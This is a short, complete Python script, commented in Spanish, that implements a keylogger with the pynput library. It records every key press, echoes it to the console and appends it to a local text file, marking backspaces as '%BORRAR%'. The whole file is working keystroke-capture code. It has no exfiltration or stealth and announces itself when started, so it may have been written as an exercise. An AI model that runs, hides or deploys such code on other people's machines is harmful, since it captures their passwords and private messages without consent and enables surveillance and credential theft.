import datetime
from pynput import keyboard

class KeyLogger:
    def __init__(self, output_file="sources/keylogger.txt"):
        self.output_file = output_file
        self.file_handle = None
        self.listener = None

    def start_logging(self):
        try:
            # Abre el archivo en modo de escritura y manejo de texto
            self.file_handle = open(self.output_file, "w")

            # Inicia el Listener para detectar las pulsaciones de teclas
            self.listener = keyboard.Listener(on_press=self.key_recorder)
            self.listener.start()

            print("Keylogger iniciado. Presiona Ctrl+C para detener.")
        except Exception as e:
            print(f"Error al iniciar el keylogger: {e}")
            self.stop_logging()

    def stop_logging(self):
        try:
            # Detiene y espera a que el Listener termine
            if self.listener:
                self.listener.stop()
                self.listener.join()

            # Cierra el archivo
            if self.file_handle:
                self.file_handle.close()

            print("Keylogger detenido.")
        except Exception as e:
            print(f"Error al detener el keylogger: {e}")

    def key_recorder(self, key):
        try:
            key = str(key)

            # Imprime la tecla presionada
            print(key)

            # Comprueba si la tecla presionada es 'Enter' y la imprime en el archivo
            if key == 'Key.enter':
                self.file_handle.write("\n")

            # Comprueba si la tecla presionada es 'Space' y la imprime en el archivo
            elif key == 'Key.space':
                self.file_handle.write(" ")

            # Comprueba si la tecla presionada es 'Backspace' y la imprime en el archivo como '%BORRAR%'
            elif key == 'Key.backspace':
                self.file_handle.write('%BORRAR%')

            # En caso contrario, imprime la tecla sin comillas en el archivo
            else:
                self.file_handle.write(key.replace("'", ""))

        except Exception as e:
            print(f"Error en la función key_recorder: {e}")
            self.stop_logging()

def main():
    key_logger = KeyLogger()

    try:
        # Inicia el keylogger
        key_logger.start_logging()

        # Mantiene el script en ejecución hasta que el usuario presiona Ctrl+C
        key_logger.listener.join()

    except KeyboardInterrupt:
        # Maneja la interrupción del usuario (Ctrl+C) de manera amigable
        print("\nInterrupción del usuario. Deteniendo el keylogger.")

    finally:
        # Detiene el keylogger y asegura que los recursos se liberen
        key_logger.stop_logging()

if __name__ == "__main__":
    main()
